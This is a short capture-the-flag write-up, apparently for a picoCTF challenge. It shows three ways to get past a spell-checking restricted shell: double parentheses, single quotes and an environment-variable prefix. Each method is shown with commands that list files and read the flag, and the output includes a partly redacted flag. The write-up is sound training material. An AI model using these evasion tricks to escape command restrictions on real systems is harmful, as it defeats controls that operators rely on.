Exploitation Techniques
Upon connecting, standard commands like ls, cat, or whoami are spell-checked into valid English words (e.g., ls becomes Is) or rejected. However, the underlying system still allows command execution if the input bypasses the spell-checker's parsing logic. 

Method 1: Double Parentheses (( ))
The spell-checker fails to process commands enclosed in double parentheses, allowing the shell to execute them literally.

List Directory Contents:
Special$ ((ls))
blargh

Inspect the Directory:
Special$ ((ls blargh))
flag.txt

Read the Flag:
Special$ ((cat blargh/flag.txt))
picoCTF{5p311ch3ck_15_7h3_w0r57_...}

Method 2: Single Quotes ' '
Enclosing commands in single quotes prevents the spell-checker from altering the string, allowing direct execution of absolute paths or standard commands.

Special$ '/bin/ls'
blargh
Special$ '/bin/cat' 'blargh/flag.txt'
picoCTF{5p311ch3ck_15_7h3_w0r57_...}

Method 3: Environment Variable Prefix
Prepending an environment variable to a command can also bypass the restriction, as the parser treats the input differently.

Special$ Placeholder=abc cat blargh/flag.txt
picoCTF{5p311ch3ck_15_7h3_w0r57_...}
